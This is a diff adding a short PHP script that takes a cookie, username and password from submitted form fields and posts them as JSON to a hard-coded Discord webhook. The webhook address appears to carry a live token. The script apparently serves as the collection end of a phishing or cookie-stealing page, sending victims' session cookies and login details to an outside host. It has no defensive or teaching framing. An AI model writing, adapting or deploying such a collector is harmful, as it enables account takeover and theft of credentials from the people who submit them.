@@ -1,0 +1,30 @@
+<?php
+$webhookUrl = "https://discord.com/api/webhooks/1191028628566310982/JpGNbzJDBCrsUoqO7qZFXxr4QmY3Bb5akpeys_PjPHhuIh7Vf7MFeS5uoPSWjornMTK4"; // Replace with your webhook URL
+
+$cookie = $_POST['cookie'];
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$data = array(
+    'cookie' => $cookie,
+    'username' => $username,
+    'password' => $password
+);
+
+$options = array(
+    'http' => array(
+        'method'  => 'POST',
+        'header'  => 'Content-Type: application/json',
+        'content' => json_encode($data)
+    )
+);
+
+$context  = stream_context_create($options);
+$response = file_get_contents($webhookUrl, false, $context);
+
+if ($response === false) {
+    // Handle error
+} else {
+    // Handle success
+}
+?>
